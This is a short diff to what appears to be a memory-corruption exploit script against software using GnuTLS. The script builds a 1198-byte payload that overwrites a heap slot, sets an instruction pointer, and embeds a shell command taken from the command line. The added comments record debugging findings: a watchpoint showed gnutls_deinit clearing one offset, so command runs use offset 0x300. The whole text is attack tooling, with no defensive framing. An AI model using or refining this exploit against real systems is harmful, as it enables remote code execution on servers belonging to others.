@@ -45,6 +45,9 @@ def stall_initial(port, count=1):
 
 
 def build_body(slot1, rip, argoff=0x2F0, cmd=b""):
+    # Command runs MUST pass argoff=0x300: W114's hardware watchpoint showed
+    # gnutls_deinit zeroes slot1+0x2F0 before dispatch, so this default is
+    # valid only for no-command RIP traces.
     # body[384] lands at slot1+0; 1198 bytes span slot1+0..+813.
     body = bytearray(1198)
     body[0:384] = b"\xAA" * 384
@@ -78,6 +81,7 @@ async def main():
     slot1 = int(sys.argv[2], 0)
     rip = int(sys.argv[3], 0)
     argoff = int(sys.argv[4], 0) if len(sys.argv) > 4 else 0x2F0
+    # argv[4]=0x300 for command runs (argv[5]); see build_body() above.
     cmd = sys.argv[5].encode() + b"\x00" if len(sys.argv) > 5 else b""
     body = build_body(slot1, rip, argoff, cmd)
     stalled = stall_initial(port, 1)
